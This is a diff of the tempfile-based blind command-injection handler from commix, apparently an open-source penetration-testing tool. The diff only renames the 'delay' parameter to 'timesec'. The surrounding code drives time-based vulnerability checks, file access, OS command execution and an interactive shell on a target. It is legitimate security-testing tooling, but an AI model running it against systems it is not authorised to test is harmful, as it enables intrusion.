@@ -91,7 +91,7 @@ def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespa
 """
 The "tempfile-based" injection technique handler
 """
-def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response):
+def tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response):
 
   counter = 1
   num_of_chars = 1
@@ -133,10 +133,10 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
         how_long_statistic = []
         if settings.LOAD_SESSION:
           cmd = shell = ""
-          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
+          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
           checks.check_for_stored_tamper(payload)
           settings.FOUND_HOW_LONG = how_long
-          settings.FOUND_DIFF = how_long - delay
+          settings.FOUND_DIFF = how_long - timesec
           OUTPUT_TEXTFILE = tmp_path + TAG + ".txt"
           
         else:
@@ -158,9 +158,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
             try:
               # Tempfile-based decision payload (check if host is vulnerable).
               if alter_shell :
-                payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
+                payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
               else:
-                payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
+                payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
 
               # Fix prefixes / suffixes
               payload = parameters.prefixes(payload, prefix)
@@ -222,9 +222,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                 else:
                   percent = ""
               else:
-                if (url_time_response == 0 and (how_long - delay) >= 0) or \
-                   (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
-                   (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+                if (url_time_response == 0 and (how_long - timesec) >= 0) or \
+                   (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
+                   (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :
 
                   # Time relative false positive fixation.
                   false_positive_fixation = False
@@ -237,7 +237,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                         statistical_anomaly = False
                         how_long_statistic = []  
 
-                    if delay <= how_long and not statistical_anomaly:
+                    if timesec <= how_long and not statistical_anomaly:
                       false_positive_fixation = True
                     else:
                       false_positive_warning = True
@@ -261,7 +261,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                           false_positive_fixation = False
                           raise
                         elif proceed_option.lower() == "c":
-                          delay = delay + 1
+                          timesec = timesec + 1
                           false_positive_fixation = True
                           break
                         elif proceed_option.lower() == "q":
@@ -275,7 +275,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                   if false_positive_fixation:
                     false_positive_fixation = False
                     settings.FOUND_HOW_LONG = how_long
-                    settings.FOUND_DIFF = how_long - delay
+                    settings.FOUND_DIFF = how_long - timesec
                     if false_positive_warning:
                       time.sleep(1)
                     randv1 = random.randrange(0, 1)
@@ -291,11 +291,11 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                       cmd = "echo $((" + str(randv1) + " + " + str(randv2) + "))"
 
                     # Check for false positive resutls
-                    how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response)
+                    how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response)
 
-                    if (url_time_response == 0 and (how_long - delay) >= 0) or \
-                       (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
-                       (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+                    if (url_time_response == 0 and (how_long - timesec) >= 0) or \
+                       (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
+                       (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :
                       
                       if str(output) == str(randvcalc) and len(TAG) == output_length:
                         possibly_vulnerable = True
@@ -361,9 +361,9 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
             break
         # Yaw, got shellz! 
         # Do some magic tricks!
-        if (url_time_response == 0 and (how_long - delay) >= 0) or \
-           (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
-           (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+        if (url_time_response == 0 and (how_long - timesec) >= 0) or \
+           (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
+           (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :
 
           if (len(TAG) == output_length) and \
              (possibly_vulnerable == True or settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level):
@@ -430,7 +430,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
             # Export session
             if not settings.LOAD_SESSION:
               shell = ""
-              session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable=menu.options.level)
+              session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable=menu.options.level)
               #possibly_vulnerable = False
             else:
               settings.LOAD_SESSION = False 
@@ -452,7 +452,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                 if len(enumerate_again) == 0:
                   enumerate_again = "y"
                 if enumerate_again in settings.CHOICE_YES:
-                  tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                  tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                   print ""
                   break
                 elif enumerate_again in settings.CHOICE_NO: 
@@ -468,7 +468,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                   pass
             else:
               if menu.enumeration_options():
-                tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                 print ""
 
             # Check for any system file access options.
@@ -484,7 +484,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                 if len(file_access_again) == 0:
                   file_access_again = "y"
                 if file_access_again in settings.CHOICE_YES:
-                  tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                  tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                   break
                 elif file_access_again in settings.CHOICE_NO: 
                   if not new_line:
@@ -501,11 +501,11 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
             else:
               # if not menu.enumeration_options() and not menu.options.os_cmd:
               #   print ""
-              tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+              tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
             
             # Check if defined single cmd.
             if menu.options.os_cmd:
-              check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+              check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
               # Export injection result
               tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
               # Delete previous shell (text) files (output) from temp.
@@ -555,7 +555,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                       cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                       cmd = checks.escaped_cmd(cmd)
                       if cmd.lower() in settings.SHELL_OPTIONS:
-                        go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, delay, go_back_again)
+                        go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again)
                         if go_back and go_back_again == False:
                           break
                         if go_back and go_back_again:
@@ -565,7 +565,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                       if menu.options.ignore_session or \
                          session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                         # The main command injection exploitation.
-                        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                         # Export injection result
                         tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
                         if not menu.options.ignore_session :
@@ -625,12 +625,12 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
 The exploitation function.
 (call the injection handler)
 """
-def exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response):
+def exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response):
   # Check if attack is based on time delays.
   if not settings.TIME_RELATIVE_ATTACK :
     settings.TIME_RELATIVE_ATTACK = True
 
-  if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response) == False:
+  if tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response) == False:
     settings.TIME_RELATIVE_ATTACK = False
     settings.TEMPFILE_BASED_STATE = False
     return False
